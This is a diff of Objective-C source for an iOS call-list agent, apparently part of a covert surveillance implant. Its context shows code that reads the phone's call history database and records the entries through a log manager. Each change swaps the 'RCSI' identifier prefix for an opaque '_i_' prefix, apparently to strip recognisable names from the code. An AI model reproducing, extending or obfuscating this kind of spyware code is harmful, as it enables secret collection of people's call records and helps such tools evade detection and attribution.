@@ -14,7 +14,7 @@
 
 //#define DEBUG
 
-NSString *kRCSIAgentCallListRunLoopMode = @"kRCSIAgentCallListRunLoopMode";
+NSString *k_i_AgentCallListRunLoopMode = @"k_i_AgentCallListRunLoopMode";
 
 #define CALL_LIST_DB_4x "/private/var/wireless/Library/CallHistory/call_history.db"
 #define CALL_LIST_DB_3x "/private/var/mobile/Library/CallHistory/call_history.db"
@@ -36,7 +36,7 @@ typedef struct _callListAdditionalHeader {
 } callListAdditionalStruct;
 
 
-@interface RCSIAgentCallList (hidden)
+@interface _i_AgentCallList (hidden)
 
 - (void)_getCallList;
 - (void)_logCallList: (NSMutableArray *)callList;
@@ -45,7 +45,7 @@ typedef struct _callListAdditionalHeader {
 
 @end
 
-@implementation RCSIAgentCallList (hidden)
+@implementation _i_AgentCallList (hidden)
 
 - (void)_getCallList
 {
@@ -222,7 +222,7 @@ typedef struct _callListAdditionalHeader {
 
       [empty release];
 
-      RCSILogManager *logManager = [RCSILogManager sharedInstance];
+      _i_LogManager *logManager = [_i_LogManager sharedInstance];
       BOOL success = [logManager createLog: LOG_CALL_LIST
                                agentHeader: nil
                                  withLogID: 0];
@@ -302,7 +302,7 @@ typedef struct _callListAdditionalHeader {
 
 @end
 
-@implementation RCSIAgentCallList
+@implementation _i_AgentCallList
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -338,7 +338,7 @@ typedef struct _callListAdditionalHeader {
                                                   userInfo: nil 
                                                    repeats: NO];
   
-  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentCallListRunLoopMode];
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentCallListRunLoopMode];
 }
 
 - (void)startAgent
@@ -358,7 +358,7 @@ typedef struct _callListAdditionalHeader {
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentCallListRunLoopMode 
+      [[NSRunLoop currentRunLoop] runMode: k_i_AgentCallListRunLoopMode 
                                beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];
         
       [innerPool release];
